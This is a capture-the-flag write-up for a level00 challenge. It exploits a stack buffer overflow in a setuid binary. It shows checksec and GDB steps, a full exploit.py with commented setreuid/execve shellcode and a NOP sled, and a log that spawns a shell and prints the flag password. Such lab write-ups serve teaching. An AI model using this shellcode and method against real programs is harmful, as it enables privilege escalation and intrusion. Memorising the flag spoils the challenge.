Looking at the `.c` code for the challenge, we notice a straightforward buffer overflow that occurs when inputting up to 80 bytes of data, with nothing complex on the source code side.

Checking the binary protections:

```sh
level00@rainfall:~$ checksec case
[*] '/home/level00/case'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x400000)
    Stack:      Executable
    RWX:        Has RWX segments
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No

```

The stack is executable with no PIE, no Canary, and no ASLR enabled. This means addresses inside GDB remain valid outside the debugger.

We run GDB with an empty environment:

```sh
level00@rainfall:~$ env -i gdb case

```

This removes environment variables that could otherwise shift the stack layout at runtime, providing a precise address for our exploit.

Using GDB, we find the buffer starts at address `0x7fffffffec60`. We can perform a standard buffer overflow attack by overwriting the saved `RIP` with the buffer's starting address, where our shellcode resides.

The shellcode executes a sequence of assembly instructions to spawn `/bin/sh` via the `execve` syscall with the privileges of the binary owner (see resources for details).

**`exploit.py`:**

```python
import sys

shellcode = (
    b"\x6a\x6b"                         # push 0x6b        ; SYS_geteuid = 107
    b"\x58"                             # pop rax
    b"\x0f\x05"                         # syscall          ; rax = euid (flag00's uid)
    b"\x48\x89\xc7"                     # mov rdi, rax     ; rdi = euid
    b"\x48\x89\xc6"                     # mov rsi, rax     ; rsi = euid
    b"\x6a\x71"                         # push 0x71        ; SYS_setreuid = 113
    b"\x58"                             # pop rax
    b"\x0f\x05"                         # syscall          ; setreuid(euid, euid)
    b"\x48\x31\xf6"                     # xor rsi, rsi
    b"\x56"                             # push rsi
    b"\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68"  # movabs rdi, "//bin/sh"
    b"\x57"                             # push rdi
    b"\x54"                             # push rsp
    b"\x5f"                             # pop rdi
    b"\x6a\x3b"                         # push 0x3b        ; SYS_execve = 59
    b"\x58"                             # pop rax
    b"\x99"                             # cdq
    b"\x0f\x05"                         # syscall          ; execve("//bin/sh", NULL, NULL)
)

offset = 88
rip = b'\x60\xec\xff\xff\xff\x7f\x00\x00'

# We can maximize the NOP sled up to 32 bytes. Beyond that, fewer than 16 bytes remain
# available for the push/pop operations in the shellcode, causing the CPU to inadvertently 
# overwrite instructions (since RSP starts around 0x7fffffffec90 and the shellcode uses 16 bytes of stack).
nop = b'\x90' * 16

payload = nop + shellcode
payload += b'\x90' * (offset - len(payload)) + rip

sys.stdout.buffer.write(payload)

```

**Execution & Flag Capture:**

```text
level00@rainfall:~$ env -i bash -c '(cat in.bin; cat) | /home/level00/case'

  ╔══════════════════════════════════════╗
  ║    SPRAWL//NET Authentication v2.1   ║
  ║      Console cowboy detected.        ║
  ╚══════════════════════════════════════╝

[SPRAWL//NET] Session 0 initialized
[SPRAWL//NET] Enter credentials: 
[SPRAWL//NET] Access denied.
[SPRAWL//NET] Audit: [1785418769] user=jkXHHjqXH1VH//bin/shWT_j;X` status=FAIL

ls
case  case.c  exploit.py  in.bin  README
whoami
flag00
cat /home/flag00/.pass
czugaihitjx0lys47blkh0qwtzz1c9g6

```